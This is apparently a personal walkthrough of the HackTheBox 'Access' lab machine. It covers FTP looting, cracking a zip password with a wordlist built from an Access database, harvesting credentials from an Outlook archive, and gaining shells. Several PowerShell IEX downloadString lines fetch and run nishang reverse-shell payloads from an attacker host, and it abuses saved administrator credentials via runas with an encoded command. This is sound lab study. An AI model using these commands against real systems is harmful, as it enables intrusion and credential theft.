2019
### NMAP

```
sudo nmap -sC -sV -oN nmap-access 10.10.10.98
```
### Enumerate for Initial Access

#### telnet 
```
telnet 10.10.10.98
```
#### ftp 
```
ftp 10.10.10.98
```

Download all files
```
wget -m ftp://anonymous:anonymous@10.10.10.98
```

![[HackTheBox/Windows/attachments/Pasted image 20250522195210.png]]
- this failed -> add --no-passive flag

```
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

Discover password protected zip file called "Access Control.zip" 

Use 7z to get encryption type as AES-256
```
7z l -slt "Access Control.zip"
```

#### zip2john
Use #zip2john to try to crack the password 

```
zip2john Access\ Control.zip > Access\ Control.hash
```

![[HackTheBox/Windows/attachments/Pasted image 20250522195851.png]]

We also discovered a backup.mdb file which is Microsoft Access Database. Use mdbtools.

```
sudo apt install mdbtools
```

Run strings against the file to see that it is not encrypted. 

Run strings to get rid of the items that are not 8 characters

```
strings -n 8 backup.mdb | sort -u > wordlist
```

Use this wordlist to crack the zip file with john..

```
john Access\ Control.hash --wordlist=wordlist
```

![[HackTheBox/Windows/attachments/Pasted image 20250522200514.png]]
- we did crack the zip to be `access4u@security`

Now we can unzip the file. Alternatively....

#### mdb-sql

```
mdb-sql backup.mdb
```
- `list tables`
- `go`

![[HackTheBox/Windows/attachments/Pasted image 20250522212607.png]]
Export the tables with a simple bash for loop 
```
for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done
```
Resulting tables
![[HackTheBox/Windows/attachments/Pasted image 20250522212945.png]]
Look at the auth_user table and find some passwords (including password to the zip file)
![[HackTheBox/Windows/attachments/Pasted image 20250522213109.png]]

Unzip the file to reveal .pst file..
```
7z x Access\ Control.zip
```

Running file against the filename to discover it's a Microsoft Outlook email folder. 

#### readpst
Convert the .pst file to readable format .mbox 
```
readpst Access\ Control.pst
```

![[HackTheBox/Windows/attachments/Pasted image 20250522213513.png]]

Now we can read the emails. 
![[HackTheBox/Windows/attachments/Pasted image 20250522213556.png]]
- found security account password as 4Cc3ssC0ntr0ller
### Initial Access

#### telnet 
Use found credentials to login to telnet 
```
telnet 10.10.10.98
```

Get a better shell using nishang's Invoke-PowershellTcp.ps1
- change to kali ip and port and serve up .ps1 with python server
- set up nc listener
- return to telnet shell and download the .ps1 

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8000/nishang.ps1')"
```
- catch reverse shell :)
### Enumerate for Priv Esc 

#### JAWS
Execute [JAWS](https://github.com/411Hall/JAWS) script 

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8001/jaws-enum.ps1')"
```

This script found stored creds for ACCESS\Administrator
![[HackTheBox/Windows/attachments/Pasted image 20250522215101.png]]

Find this manually using 
```
cmdkey /list
```

Manually discover a shortcut .lnk file in C:\Users\Public\Desktop. 

Run Get-Content against this file to discover location of the saved cred?

![[HackTheBox/Windows/attachments/Pasted image 20250522215521.png]]

![[HackTheBox/Windows/attachments/Pasted image 20250522215540.png]]

Use powershell to discover info about this shortcut 

```
$WScript = New-Object -ComObject Wscript.Shell
```

```
$shortcut = Get-ChildItem *.lnk
```

![[HackTheBox/Windows/attachments/Pasted image 20250522215837.png]]

Create shortcut with a name that already exists which will print out all the info of existing shortcut 

```
$Wscript.CreateShortcut($shortcut)
```

![[HackTheBox/Windows/attachments/Pasted image 20250522220024.png]]

```
runas /user:Access\Administrator /savecred "whoami > test"
```
- this didn't work

### Priv Esc

Attempt to get a reverse shell.

- Modify Nishang's Invoke-PowershellTcp.ps1 with Kali IP and different port number. 
- Host file using python http server. 
- Set up nc listener on specified port
- Base64 encode command that grabs Nishang payload using Kali terminal

```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8001/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

![[OSCP/attachments/Pasted image 20250523213448.png]]

- Download this encoded string using -EncodedCommand flag in PowerShell and the runas /user functionality in windows
![[HackTheBox/Windows/attachments/Pasted image 20250523213715.png]]

⭐got root⭐